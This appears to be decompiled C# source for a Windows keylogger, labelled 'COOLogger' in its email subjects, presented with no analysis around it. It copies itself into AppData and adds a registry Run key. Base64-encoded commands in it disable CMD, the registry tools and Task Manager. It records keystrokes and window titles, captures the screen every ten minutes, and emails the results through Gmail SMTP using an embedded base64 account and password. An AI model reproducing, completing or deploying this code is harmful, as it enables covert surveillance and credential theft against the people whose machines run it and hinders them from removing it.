using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class xoOdWGnqLnrGQly
{
	private static string lYzVUwevhlLlwqJ = "bGV3aXNyaGlub3RoaW5rQGdtYWlsLmNvbQ==";

	private static string GdyXPLXoDYMVtnR = "ZGl2aW5pdHkxNjkx";

	private static string TzUZhXDMMLPmtBf = "smtp.gmail.com";

	private static int rrHLOGetmWEHbEI = 587;

	private static string oOdWGnqLnrGQlyl;

	private static string YzVUwevhlLlwqJG;

	private static string dyXPLXoDYMVtnRT;

	private static string zUZhXDMMLPmtBfr;

	private static string rHLOGetmWEHbEIW;

	private static string RHmuvtykdkPbbqu;

	private static int CNHZJfPafcnFTbc = 600000;

	private static string mIVjRiUYxmjdvsQ = null;

	private static string uxBsRgZJqtOquJT = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string oCobDZXzhykoOoz = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string tMJgCaSParGbPYw = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object WTCPooQYkNgMjCb = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string lKFhjQWpxnTOPNS = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage DKRhJIYOQIhKomV = new MailMessage();

	private static SmtpClient eJsodxnesDllYLm = new SmtpClient();

	[AccessedThroughProperty("GplZukbpziiVIiF")]
	private static IVjRiUYxmjdvsQl _GplZukbpziiVIiF;

	private static object JUXmIJTcXBRjEXR = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox BeJsodxnesDllYL = new RichTextBox();

	private static IVjRiUYxmjdvsQl GplZukbpziiVIiF
	{
		get
		{
			return _GplZukbpziiVIiF;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_GplZukbpziiVIiF != null)
			{
				IVjRiUYxmjdvsQl.KeyDown -= xBsRgZJqtOquJTo;
			}
			_GplZukbpziiVIiF = value;
			if (_GplZukbpziiVIiF != null)
			{
				IVjRiUYxmjdvsQl.KeyDown += xBsRgZJqtOquJTo;
			}
		}
	} = new IVjRiUYxmjdvsQl();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_02fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Expected O, but got Unknown
		RHmuvtykdkPbbqu = Conversions.ToString(true);
		dyXPLXoDYMVtnRT = Conversions.ToString(false);
		zUZhXDMMLPmtBfr = Conversions.ToString(false);
		rHLOGetmWEHbEIW = Conversions.ToString(false);
		YzVUwevhlLlwqJG = Conversions.ToString(false);
		oOdWGnqLnrGQlyl = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, WTCPooQYkNgMjCb, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(WTCPooQYkNgMjCb, (object)"\\KRhJIYOQIhKomVJ.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(lKFhjQWpxnTOPNS + "\\KRhJIYOQIhKomVJ.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(WTCPooQYkNgMjCb, (object)"\\"), JUXmIJTcXBRjEXR))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(WTCPooQYkNgMjCb, (object)"\\"), JUXmIJTcXBRjEXR)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(WTCPooQYkNgMjCb, (object)"\\"), JUXmIJTcXBRjEXR)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(WTCPooQYkNgMjCb, (object)"\\"), JUXmIJTcXBRjEXR)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(WTCPooQYkNgMjCb, (object)"\\"), JUXmIJTcXBRjEXR) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(oOdWGnqLnrGQlyl))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(JUXmIJTcXBRjEXR)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(JUXmIJTcXBRjEXR), Operators.ConcatenateObject(Operators.ConcatenateObject(WTCPooQYkNgMjCb, (object)"\\"), JUXmIJTcXBRjEXR));
			}
		}
		if (Conversions.ToBoolean(YzVUwevhlLlwqJG))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(WTCPooQYkNgMjCb, (object)"\\KRhJIYOQIhKomVJ.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(dyXPLXoDYMVtnRT))
		{
			Interaction.Shell(CobDZXzhykoOozt(uxBsRgZJqtOquJT), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(zUZhXDMMLPmtBfr))
		{
			Interaction.Shell(CobDZXzhykoOozt(oCobDZXzhykoOoz), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(rHLOGetmWEHbEIW))
		{
			Interaction.Shell(CobDZXzhykoOozt(tMJgCaSParGbPYw), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(600000);
		val.add_Tick((EventHandler)SgNfRVujgaspMiH_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)NJUXmIJTcXBRjEX_Ticked);
		val2.Start();
		GplZukbpziiVIiF.KQMYbpLNWgaEUmH();
		Application.Run();
	}

	private static string WrsDaHkzgnGOEje()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string CobDZXzhykoOozt(string ivuLORJhwpZIKeH)
	{
		byte[] bytes = Convert.FromBase64String(ivuLORJhwpZIKeH);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void SgNfRVujgaspMiH_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(RHmuvtykdkPbbqu))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = HaUKpyyxCngnSee(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(WTCPooQYkNgMjCb, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(WTCPooQYkNgMjCb, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(CobDZXzhykoOozt(lYzVUwevhlLlwqJ));
				mailMessage.To.Add(CobDZXzhykoOozt(lYzVUwevhlLlwqJ));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = BeJsodxnesDllYL.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(CobDZXzhykoOozt(lYzVUwevhlLlwqJ), CobDZXzhykoOozt(GdyXPLXoDYMVtnR));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				BeJsodxnesDllYL.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage dKRhJIYOQIhKomV = DKRhJIYOQIhKomV;
		dKRhJIYOQIhKomV.From = new MailAddress(CobDZXzhykoOozt(lYzVUwevhlLlwqJ));
		dKRhJIYOQIhKomV.To.Add(CobDZXzhykoOozt(lYzVUwevhlLlwqJ));
		dKRhJIYOQIhKomV.Subject = "COOLogger Logs from - " + Environment.UserName;
		dKRhJIYOQIhKomV.Body = BeJsodxnesDllYL.get_Text();
		dKRhJIYOQIhKomV = null;
		SmtpClient smtpClient2 = eJsodxnesDllYLm;
		smtpClient2.Host = "smtp.gmail.com";
		smtpClient2.Port = 587;
		smtpClient2.EnableSsl = true;
		smtpClient2.Credentials = new NetworkCredential(CobDZXzhykoOozt(lYzVUwevhlLlwqJ), CobDZXzhykoOozt(GdyXPLXoDYMVtnR));
		smtpClient2.Send(DKRhJIYOQIhKomV);
		smtpClient2 = null;
		BeJsodxnesDllYL.set_Text("");
	}

	public static void xBsRgZJqtOquJTo(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox beJsodxnesDllYL = BeJsodxnesDllYL;
		beJsodxnesDllYL.set_Text(beJsodxnesDllYL.get_Text() + GplZukbpziiVIiF.aUKpyyxCngnSeeu(e));
	}

	public static void NJUXmIJTcXBRjEX_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(mIVjRiUYxmjdvsQ, WrsDaHkzgnGOEje(), false) != 0)
		{
			mIVjRiUYxmjdvsQ = WrsDaHkzgnGOEje();
			if (Operators.CompareString(mIVjRiUYxmjdvsQ, "", false) != 0)
			{
				RichTextBox beJsodxnesDllYL = BeJsodxnesDllYL;
				beJsodxnesDllYL.set_Text(beJsodxnesDllYL.get_Text() + "\r\n\r\n~~~~~" + mIVjRiUYxmjdvsQ + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string HaUKpyyxCngnSee(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
